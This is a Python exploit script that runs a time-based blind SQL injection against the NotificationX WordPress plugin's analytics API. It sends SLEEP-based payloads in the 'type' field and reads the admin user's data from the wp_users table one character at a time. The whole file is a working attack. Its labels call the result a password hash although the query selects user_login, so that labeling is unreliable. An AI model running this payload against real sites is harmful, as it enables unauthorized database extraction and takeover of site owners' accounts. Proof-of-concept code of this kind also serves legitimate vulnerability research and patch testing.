import requests
import string
from sys import exit

# Sleep time for SQL payloads
delay = 0.5

# URL for the NotificationX Analytics API
url = "http://localhost/wp-json/notificationx/v1/analytics"
admin_password_hash = ""
session = requests.Session()

for idx in range(1, 41):
    # Iterate over all the printable characters + NULL byte
    for ascii_val in (b"\x00" + string.printable.encode()):
        # Send the payload
        resp = session.post(url, data={
            "nx_id": 1337,
            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_login from wp_users where id=1),{idx},1))={ascii_val},SLEEP({delay}),null)-- -"
        })

        # Elapsed time > delay if delay happened due to SQLi
        if resp.elapsed.total_seconds() > delay:
            admin_password_hash += chr(ascii_val)
            # Show what we have found so far...
            print(admin_password_hash)
            # Exit condition - encountered a null byte
            if ascii_val == 0:
                print("[*] Admin password hash:", admin_password_hash)
                exit(0)
